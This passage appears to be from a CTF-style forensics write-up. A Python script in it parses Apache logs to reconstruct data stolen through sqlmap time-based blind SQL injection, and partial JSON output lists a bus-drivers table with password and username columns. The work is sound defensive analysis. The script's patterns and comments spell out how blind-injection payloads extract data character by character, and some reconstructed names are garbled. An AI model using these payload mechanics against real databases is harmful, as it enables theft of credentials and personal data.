                  <span class="string">&#x27;timestamp&#x27;</span>: timestamp,</span><br><span class="line">                    <span class="string">&#x27;raw_line&#x27;</span>: line</span><br><span class="line">                &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">analyze_payload_v3</span>(<span class="params">payload, response_size</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;分析SQL注入payload - 针对sqlmap时间盲注优化&quot;&quot;&quot;</span></span><br><span class="line">    analysis = &#123;</span><br><span class="line">        <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;unknown&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;database&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;table&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;column&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;position&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&#x27;ascii_value&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&#x27;limit_offset&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&#x27;sleep_triggered&#x27;</span>: <span class="literal">False</span>,</span><br><span class="line">        <span class="string">&#x27;comparison_operator&#x27;</span>: <span class="string">&#x27;&gt;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;record_id&#x27;</span>: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 精确的SLEEP触发判断</span></span><br><span class="line">    analysis[<span class="string">&#x27;sleep_triggered&#x27;</span>] = response_size == <span class="number">1346</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 修正的SLEEP触发判断 - 基于实际日志分析</span></span><br><span class="line">    analysis[<span class="string">&#x27;sleep_triggered&#x27;</span>] = response_size &lt; <span class="number">1406</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检测sqlmap特有的嵌套IF结构</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;SLEEP(1-(IF(&#x27;</span> <span class="keyword">in</span> payload.upper():</span><br><span class="line">        analysis[<span class="string">&#x27;type&#x27;</span>] = <span class="string">&#x27;time_blind_injection&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 提取ORD(MID(...))结构中的信息</span></span><br><span class="line">    ord_mid_pattern = <span class="string">r&#x27;ORD\(MID\(\(SELECT\s+.*?FROM\s+(\w+)\.(\w+).*?LIMIT\s+(\d+),1\),(\d+),1\)\)([&gt;&lt;!]=?)(\d+)&#x27;</span></span><br><span class="line">    <span class="keyword">match</span> = re.search(ord_mid_pattern, payload, re.IGNORECASE)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        analysis[<span class="string">&#x27;database&#x27;</span>] = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">        analysis[<span class="string">&#x27;table&#x27;</span>] = <span class="keyword">match</span>.group(<span class="number">2</span>)</span><br><span class="line">        analysis[<span class="string">&#x27;limit_offset&#x27;</span>] = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">3</span>))</span><br><span class="line">        analysis[<span class="string">&#x27;position&#x27;</span>] = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">4</span>))</span><br><span class="line">        analysis[<span class="string">&#x27;comparison_operator&#x27;</span>] = <span class="keyword">match</span>.group(<span class="number">5</span>)</span><br><span class="line">        analysis[<span class="string">&#x27;ascii_value&#x27;</span>] = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">6</span>))</span><br><span class="line">        analysis[<span class="string">&#x27;record_id&#x27;</span>] = analysis[<span class="string">&#x27;limit_offset&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 提取字段名</span></span><br><span class="line">    field_pattern = <span class="string">r&#x27;CAST\((\w+)\s+AS&#x27;</span></span><br><span class="line">    field_match = re.search(field_pattern, payload, re.IGNORECASE)</span><br><span class="line">    <span class="keyword">if</span> field_match:</span><br><span class="line">        analysis[<span class="string">&#x27;column&#x27;</span>] = field_match.group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> analysis</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reconstruct_character_v3</span>(<span class="params">comparisons</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;基于sqlmap时间盲注逻辑重构字符&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> comparisons:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># sqlmap的逻辑：SLEEP(1-IF(condition,0,1))</span></span><br><span class="line">    <span class="comment"># condition为真时SLEEP(0)不延时，为假时SLEEP(1)延时</span></span><br><span class="line">    <span class="comment"># 响应大小1346表示SLEEP触发（延时），即condition为假</span></span><br><span class="line"></span><br><span class="line">    min_val = <span class="number">32</span></span><br><span class="line">    max_val = <span class="number">126</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> comp <span class="keyword">in</span> <span class="built_in">sorted</span>(comparisons, key=<span class="keyword">lambda</span> x: x[<span class="string">&#x27;ascii_value&#x27;</span>]):</span><br><span class="line">        ascii_val = comp[<span class="string">&#x27;ascii_value&#x27;</span>]</span><br><span class="line">        sleep_triggered = comp[<span class="string">&#x27;sleep_triggered&#x27;</span>]</span><br><span class="line">        operator = comp.get(<span class="string">&#x27;comparison_operator&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> operator == <span class="string">&#x27;!=&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> sleep_triggered:</span><br><span class="line">                <span class="comment"># SLEEP触发，condition为假，即字符 == ascii_val</span></span><br><span class="line">                <span class="keyword">return</span> ascii_val</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># SLEEP未触发，condition为真，即字符 != ascii_val</span></span><br><span class="line">                <span class="comment"># 排除这个值，继续处理其他比较</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> operator == <span class="string">&#x27;&gt;&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> sleep_triggered:</span><br><span class="line">                <span class="comment"># SLEEP触发，condition为假，即字符 &lt;= ascii_val</span></span><br><span class="line">                max_val = <span class="built_in">min</span>(max_val, ascii_val)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># SLEEP未触发，condition为真，即字符 &gt; ascii_val</span></span><br><span class="line">                min_val = <span class="built_in">max</span>(min_val, ascii_val + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> operator == <span class="string">&#x27;&lt;&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> sleep_triggered:</span><br><span class="line">                <span class="comment"># SLEEP触发，condition为假，即字符 &gt;= ascii_val</span></span><br><span class="line">                min_val = <span class="built_in">max</span>(min_val, ascii_val)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># SLEEP未触发，condition为真，即字符 &lt; ascii_val</span></span><br><span class="line">                max_val = <span class="built_in">min</span>(max_val, ascii_val - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 返回收敛结果</span></span><br><span class="line">    <span class="keyword">if</span> min_val == max_val:</span><br><span class="line">        <span class="keyword">return</span> min_val</span><br><span class="line">    <span class="keyword">elif</span> min_val &lt; max_val:</span><br><span class="line">        <span class="keyword">return</span> min_val</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reconstruct_data_v3</span>(<span class="params">payload_analyses</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;重构被提取的数据 - 针对sqlmap优化&quot;&quot;&quot;</span></span><br><span class="line">    results = &#123;</span><br><span class="line">        <span class="string">&#x27;database&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tables&#x27;</span>: [],</span><br><span class="line">        <span class="string">&#x27;columns&#x27;</span>: &#123;&#125;,</span><br><span class="line">        <span class="string">&#x27;data&#x27;</span>: &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 收集数据提取信息</span></span><br><span class="line">    data_extractions = defaultdict(<span class="keyword">lambda</span>: defaultdict(<span class="keyword">lambda</span>: defaultdict(<span class="keyword">lambda</span>: defaultdict(<span class="built_in">list</span>))))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> analysis <span class="keyword">in</span> payload_analyses:</span><br><span class="line">        <span class="keyword">if</span> analysis[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;time_blind_injection&#x27;</span> <span class="keyword">and</span> analysis[<span class="string">&#x27;table&#x27;</span>] <span class="keyword">and</span> analysis[<span class="string">&#x27;column&#x27;</span>]:</span><br><span class="line">            <span class="comment"># 设置基本信息</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> results[<span class="string">&#x27;database&#x27;</span>]:</span><br><span class="line">                results[<span class="string">&#x27;database&#x27;</span>] = analysis[<span class="string">&#x27;database&#x27;</span>]</span><br><span class="line"></span><br><span class="line">            table_name = analysis[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> table_name <span class="keyword">not</span> <span class="keyword">in</span> results[<span class="string">&#x27;tables&#x27;</span>]:</span><br><span class="line">                results[<span class="string">&#x27;tables&#x27;</span>].append(table_name)</span><br><span class="line"></span><br><span class="line">            table_key = <span class="string">f&quot;<span class="subst">&#123;analysis[<span class="string">&#x27;database&#x27;</span>]&#125;</span>.<span class="subst">&#123;analysis[<span class="string">&#x27;table&#x27;</span>]&#125;</span>&quot;</span></span><br><span class="line">            column = analysis[<span class="string">&#x27;column&#x27;</span>]</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 记录列信息</span></span><br><span class="line">            <span class="keyword">if</span> table_key <span class="keyword">not</span> <span class="keyword">in</span> results[<span class="string">&#x27;columns&#x27;</span>]:</span><br><span class="line">                results[<span class="string">&#x27;columns&#x27;</span>][table_key] = []</span><br><span class="line">            <span class="keyword">if</span> column <span class="keyword">not</span> <span class="keyword">in</span> results[<span class="string">&#x27;columns&#x27;</span>][table_key]:</span><br><span class="line">                results[<span class="string">&#x27;columns&#x27;</span>][table_key].append(column)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 收集字符比较数据</span></span><br><span class="line">            <span class="keyword">if</span> analysis[<span class="string">&#x27;position&#x27;</span>] &gt; <span class="number">0</span>:</span><br><span class="line">                record_id = analysis[<span class="string">&#x27;record_id&#x27;</span>]</span><br><span class="line">                position = analysis[<span class="string">&#x27;position&#x27;</span>]</span><br><span class="line"></span><br><span class="line">                data_extractions[table_key][column][record_id][position].append(&#123;</span><br><span class="line">                    <span class="string">&#x27;ascii_value&#x27;</span>: analysis[<span class="string">&#x27;ascii_value&#x27;</span>],</span><br><span class="line">                    <span class="string">&#x27;sleep_triggered&#x27;</span>: analysis[<span class="string">&#x27;sleep_triggered&#x27;</span>],</span><br><span class="line">                    <span class="string">&#x27;comparison_operator&#x27;</span>: analysis[<span class="string">&#x27;comparison_operator&#x27;</span>]</span><br><span class="line">                &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 重构字符串数据</span></span><br><span class="line">    <span class="keyword">for</span> table_key, columns <span class="keyword">in</span> data_extractions.items():</span><br><span class="line">        results[<span class="string">&#x27;data&#x27;</span>][table_key] = &#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> column, records <span class="keyword">in</span> columns.items():</span><br><span class="line">            reconstructed_records = []</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> record_id <span class="keyword">in</span> <span class="built_in">sorted</span>(records.keys()):</span><br><span class="line">                positions = records[record_id]</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> positions:</span><br><span class="line">                    max_pos = <span class="built_in">max</span>(positions.keys())</span><br><span class="line">                    chars = []</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, max_pos + <span class="number">1</span>):</span><br><span class="line">                        <span class="keyword">if</span> pos <span class="keyword">in</span> positions:</span><br><span class="line">                            char_code = reconstruct_character_v3(positions[pos])</span><br><span class="line">                            <span class="keyword">if</span> char_code <span class="keyword">and</span> <span class="number">32</span> &lt;= char_code &lt;= <span class="number">126</span>:</span><br><span class="line">                                chars.append(<span class="built_in">chr</span>(char_code))</span><br><span class="line">                            <span class="keyword">elif</span> char_code == <span class="number">0</span>:</span><br><span class="line">                                <span class="keyword">break</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">                    reconstructed_value = <span class="string">&#x27;&#x27;</span>.join(chars)</span><br><span class="line">                    <span class="keyword">if</span> reconstructed_value <span class="keyword">and</span> <span class="built_in">len</span>(reconstructed_value) &gt;= <span class="number">1</span>:</span><br><span class="line">                        reconstructed_records.append(&#123;</span><br><span class="line">                            <span class="string">&#x27;record_id&#x27;</span>: record_id,</span><br><span class="line">                            <span class="string">&#x27;value&#x27;</span>: reconstructed_value</span><br><span class="line">                        &#125;)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> reconstructed_records:</span><br><span class="line">                reconstructed_records.sort(key=<span class="keyword">lambda</span> x: x[<span class="string">&#x27;record_id&#x27;</span>])</span><br><span class="line">                results[<span class="string">&#x27;data&#x27;</span>][table_key][column] = [r[<span class="string">&#x27;value&#x27;</span>] <span class="keyword">for</span> r <span class="keyword">in</span> reconstructed_records]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> results</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    log_file = <span class="string">&#x27;access.log&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;开始分析SQL时间盲注攻击 - V3完美版本...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解析日志文件</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;解析Apache日志文件: <span class="subst">&#123;log_file&#125;</span>&quot;</span>)</span><br><span class="line">    requests = parse_apache_log(log_file)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;成功加载 <span class="subst">&#123;<span class="built_in">len</span>(requests)&#125;</span> 行相关日志&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> requests:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;未找到相关的SQL注入请求&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 提取和解码payload</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;提取HTTP请求...&quot;</span>)</span><br><span class="line">    relevant_requests = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> req <span class="keyword">in</span> requests:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;query=&#x27;</span> <span class="keyword">in</span> req[<span class="string">&#x27;url_path&#x27;</span>]:</span><br><span class="line">            <span class="keyword">match</span> = re.search(<span class="string">r&#x27;query=([^&amp;\s]+)&#x27;</span>, req[<span class="string">&#x27;url_path&#x27;</span>])</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                encoded_payload = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">                decoded_payload = decode_payload(encoded_payload)</span><br><span class="line"></span><br><span class="line">                req[<span class="string">&#x27;encoded_payload&#x27;</span>] = encoded_payload</span><br><span class="line">                req[<span class="string">&#x27;decoded_payload&#x27;</span>] = decoded_payload</span><br><span class="line">                relevant_requests.append(req)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;找到 <span class="subst">&#123;<span class="built_in">len</span>(relevant_requests)&#125;</span> 个相关请求&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 分析payload</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解码和分析payload...&quot;</span>)</span><br><span class="line">    payload_analyses = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> req <span class="keyword">in</span> relevant_requests:</span><br><span class="line">        analysis = analyze_payload_v3(req[<span class="string">&#x27;decoded_payload&#x27;</span>], req[<span class="string">&#x27;response_size&#x27;</span>])</span><br><span class="line">        analysis[<span class="string">&#x27;request&#x27;</span>] = req</span><br><span class="line">        payload_analyses.append(analysis)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 重构被提取的数据</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;重构被提取的数据...&quot;</span>)</span><br><span class="line">    results = reconstruct_data_v3(payload_analyses)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 生成报告</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;SQL时间盲注攻击分析报告 - V3完美版本&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> results[<span class="string">&#x27;database&#x27;</span>]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n[+] 目标数据库: <span class="subst">&#123;results[<span class="string">&#x27;database&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> results[<span class="string">&#x27;tables&#x27;</span>]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n[+] 发现的表:&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> table <span class="keyword">in</span> results[<span class="string">&#x27;tables&#x27;</span>]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot; - <span class="subst">&#123;table&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> results[<span class="string">&#x27;columns&#x27;</span>]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n[+] 发现的列结构:&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> table_key, columns <span class="keyword">in</span> results[<span class="string">&#x27;columns&#x27;</span>].items():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot; <span class="subst">&#123;table_key&#125;</span>:&quot;</span>)</span><br><span class="line">            <span class="keyword">for</span> column <span class="keyword">in</span> columns:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot; - <span class="subst">&#123;column&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> results[<span class="string">&#x27;data&#x27;</span>]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n[+] 成功提取的数据:&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> table_key, columns <span class="keyword">in</span> results[<span class="string">&#x27;data&#x27;</span>].items():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot; <span class="subst">&#123;table_key&#125;</span>:&quot;</span>)</span><br><span class="line">            <span class="keyword">for</span> column, records <span class="keyword">in</span> columns.items():</span><br><span class="line">                <span class="keyword">if</span> records:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot; <span class="subst">&#123;column&#125;</span>: <span class="subst">&#123;records&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n[-] 未能提取到具体数据&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 保存详细分析结果</span></span><br><span class="line">    output_data = &#123;</span><br><span class="line">        <span class="string">&#x27;results&#x27;</span>: results,</span><br><span class="line">        <span class="string">&#x27;total_requests&#x27;</span>: <span class="built_in">len</span>(relevant_requests),</span><br><span class="line">        <span class="string">&#x27;analysis_time&#x27;</span>: datetime.now().isoformat()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;sql_injection_analysis_v3.json&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        json.dump(output_data, f, indent=<span class="number">2</span>, ensure_ascii=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n[+] 详细分析结果已保存到 sql_injection_analysis_v3.json&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>得到输出：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;results&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;database&quot;</span><span class="punctuation">:</span> <span class="string">&quot;INFORMATION_SCHEMA&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;tables&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="string">&quot;SCHEMATA&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="string">&quot;TABLES&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="string">&quot;COLUMNS&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="string">&quot;bus_drivers&quot;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;columns&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;INFORMATION_SCHEMA.SCHEMATA&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;schema_name&quot;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;INFORMATION_SCHEMA.TABLES&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;table_name&quot;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;INFORMATION_SCHEMA.COLUMNS&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;column_name&quot;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;bus_system.bus_drivers&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;employee_id&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;full_name&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;password&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;username&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;INFORMATION_SCHEMA.SCHEMATA&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;schema_name&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">          <span class="string">&quot;information_schema&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;bus_system&quot;</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;INFORMATION_SCHEMA.TABLES&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;table_name&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">          <span class="string">&quot;bus_drivers&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;news&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;stops&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;routes&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;lost_items&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;route_stops&quot;</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;INFORMATION_SCHEMA.COLUMNS&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;column_name&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">          <span class="string">&quot;id&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;eipleyee_ida&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;full_name&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;username&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;qassyqyqa&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;register_date&quot;</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;bus_system.bus_drivers&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;employee_id&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">          <span class="string">&quot;BJ2024007&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;BJ2024005&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;BJ2024016&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;BJ2024011&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;BJ2024018&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span 